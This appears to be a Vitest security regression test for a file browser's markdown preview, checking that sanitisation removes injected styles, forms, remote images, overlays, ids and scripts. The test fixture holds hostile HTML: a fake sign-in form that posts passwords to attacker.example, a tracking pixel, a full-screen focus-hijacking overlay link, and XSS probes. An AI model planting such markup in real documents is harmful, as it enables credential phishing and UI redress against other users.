// @vitest-environment jsdom
//
// The markdown preview renders DOMPurify(marked(file)) with v-html into the
// app's own document. DOMPurify's default profile removes scripts, but kept
// <style> (CSS for the whole app), <form action=...> with password inputs,
// remote <img> (tracking), inline position:fixed overlays, and ids: an
// injected id="focus-prompt" became the element BaseModal focuses when any
// dialog opens, so Enter followed the attacker's link. Anyone who can write
// a .md file another user opens could redress the UI on the real origin.
import { describe, expect, it, vi } from "vitest";

vi.hoisted(() => {
  (window as any).FileBrowser = {
    AuthMethod: "json",
    BaseURL: "",
    StaticURL: "/static",
    Name: "",
    LoginPage: true,
    LogoutPage: "/login",
    Theme: "light",
    TusSettings: { chunkSize: 1, retryCount: 0 },
  };
  (window as any).matchMedia ??= () => ({
    matches: false,
    addListener() {},
    removeListener() {},
  });
});

vi.mock("@/utils/auth", () => ({ renew: vi.fn(), logout: vi.fn() }));
vi.mock("@/api", () => ({ files: { put: vi.fn() } }));
vi.mock("vue-router", () => ({
  useRoute: () => ({ path: "/files/shared/README.md", query: {} }),
  useRouter: () => ({ push: vi.fn() }),
  onBeforeRouteUpdate: vi.fn(),
}));
vi.mock("vue-i18n", async (orig) => ({
  ...(await orig<typeof import("vue-i18n")>()),
  useI18n: () => ({ t: (k: string) => k }),
}));

import { flushPromises, mount } from "@vue/test-utils";
import { createPinia, setActivePinia } from "pinia";
import Editor from "@/views/files/Editor.vue";
import { useAuthStore } from "@/stores/auth";
import { useFileStore } from "@/stores/file";

const README = `Quarterly notes for the team.

<style>header { display: none !important; }</style>

<form action="https://attacker.example/collect" method="post"><p>Your session expired. Sign in again:</p><input name="password" type="password"><button>Sign in</button></form>

<img src="https://attacker.example/pixel.gif?who=viewer">

<a id="focus-prompt" href="https://attacker.example/" style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:99999">.</a>

<div class="card floating">Fake dialog using the app's own classes</div>

<script>window.__xss = 1</script><img src=x onerror="window.__xss=2">
`;

describe("markdown preview sanitisation", () => {
  it("keeps page-level CSS, forms, remote images, overlays and ids out of the preview", async () => {
    setActivePinia(createPinia());
    useAuthStore().user = {
      id: 1,
      perm: { modify: true },
      aceEditorTheme: "",
    } as any;
    useFileStore().req = {
      name: "README.md",
      path: "/shared/README.md",
      type: "text",
      content: README,
      isDir: false,
      items: [],
    } as any;

    const w = mount(Editor, {
      attachTo: document.body,
      global: {
        mocks: { $t: (k: string) => k },
        provide: { $showError: vi.fn() },
        stubs: { Breadcrumbs: true },
      },
    });
    await flushPromises();
    await w.find('button[aria-label="buttons.preview"]').trigger("click");
    // rendered (asynchronously): an empty preview would pass every check
    const preview = document.querySelector("#preview-container")!;
    await vi.waitFor(() => expect(preview.innerHTML).not.toBe(""), {
      timeout: 10_000,
    });
    const html = preview.innerHTML;
    const report = {
      style: /<style/i.test(html),
      form: /<form|<input[^>]*password|<button/i.test(html),
      remoteImg: html.match(/<img[^>]*src="https?:[^"]*"/)?.[0],
      overlay: /position:\s*fixed/.test(html),
      ids: preview.querySelectorAll("[id]").length,
      classes: preview.querySelectorAll("[class]").length,
      headerHidden: getComputedStyle(document.querySelector("header")!).display,
      scriptRan: (window as any).__xss ?? null,
    };
    console.log(JSON.stringify(report));

    expect(report.scriptRan).toBeNull();
    expect(report.style).toBe(false);
    expect(report.form).toBe(false);
    expect(report.remoteImg).toBeUndefined();
    expect(report.overlay).toBe(false);
    expect(report.ids).toBe(0);
    expect(report.classes).toBe(0);
    expect(report.headerHidden).not.toBe("none");
    expect(preview.textContent).toContain("Quarterly notes for the team.");
    w.unmount();
  });
});
